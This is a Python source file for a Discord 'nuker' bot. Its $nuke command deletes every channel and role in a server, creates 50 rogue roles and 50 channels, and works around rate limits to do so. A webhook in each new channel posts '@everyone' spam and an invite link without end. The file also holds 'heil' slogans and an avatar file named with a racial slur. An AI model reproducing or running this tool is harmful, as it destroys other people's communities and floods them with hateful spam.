import asyncio
import aiohttp
import random
import discord.ext
import requests as rq_
from colorama import Fore
from discord.ext import commands

prefix = '$'
intents = discord.Intents.all()
TOKEN = input("Token:")
headers = {'Authorization': f'Bot {TOKEN}'}
chNames = ['heil hmg', 'heil hmg', 'heil hmg', 'heil hmg']
rNames = ['Nuked By Jak | Heil the Guard', 'Nuked By Jak | Heil the Guard']
SPAM = ["""
```Nuked By His Majesty's Guard```

__**HEIL THE GUARD**__
https://media.discordapp.net/attachments/1091794018301661355/1091794133120720966/Untitled296_20221128195950.png
https://discord.gg/rdXHweYQ7f
||@everyone||
"""]
rq = rq_.Session()

with open("nigger.png", "rb") as image:
    avatar = image.read()

Sachs = commands.Bot(command_prefix=prefix, intents=intents, case_insensitive=True)


### Functions ###
async def deleteChannel(channel, session):
    while True:
        async with session.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers) as channelDel:
            if channelDel.status == 429:
                response = await channelDel.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


async def createChannel(guild, session):
    json = {"name": random.choice(chNames)}
    while True:
        async with session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers,
                                json=json) as channelCre:
            if channelCre.status == 429:
                response = await channelCre.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


async def createRole(guild, session):
    json = {"name": random.choice(rNames), "color": "0x4a412a"}
    while True:
        async with session.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers,
                                json=json) as roleCre:
            if roleCre.status == 429:
                response = await roleCre.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


async def deleteRole(guild, role, session):
    while True:
        async with session.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                  headers=headers) as roleDel:
            if roleDel.status == 429:
                response = await roleDel.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


### Bot Events ###
@Sachs.event
async def on_ready():
    print(f"{Fore.RED}Ready to cause Mayhem{Fore.RESET}")


@Sachs.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="HEIL THE GUARD")
    while True:
        await webhook.send(SPAM)


### Bot Commands ###
"""
@Sachs.command()
async def cdel(ctx):
    channels = []

    for channel in ctx.guild.channels:
        channels.append(channel.id)

    async with aiohttp.ClientSession() as session:
        tasks = []

        for channel in channels:
            tasks.append(asyncio.create_task(deleteChannel(channel, session)))
"""


@Sachs.command(aliases=['beam', 'fuck', 'wizz'])
async def nuke(ctx):
    guild = ctx.guild

    channels = []
    roles = []

    for channel in guild.channels:
        channels.append(channel.id)
    for role in guild.roles:
        roles.append(role.id)

    async with aiohttp.ClientSession() as session:
        tasks = []

        for channel in channels:
            tasks.append(asyncio.create_task(deleteChannel(channel, session)))
        await asyncio.gather(*tasks)

        for role in roles:
            tasks.append(asyncio.create_task(deleteRole(guild.id, role, session)))
        await asyncio.gather(*tasks)

        for i in range(50):
            tasks.append(asyncio.create_task(createRole(guild.id, session)))
        await asyncio.gather(*tasks)

        for i in range(50):
            tasks.append(asyncio.create_task(createChannel(guild.id, session)))
        await asyncio.gather(*tasks)

    """  
    async with aiohttp.ClientSession() as session:
      tasks = []
      for i in range(50):
        tasks.append(asyncio.create_task(createChannel(guild.id, session)))
      await asyncio.gather(*tasks)
    """


Sachs.run(TOKEN)
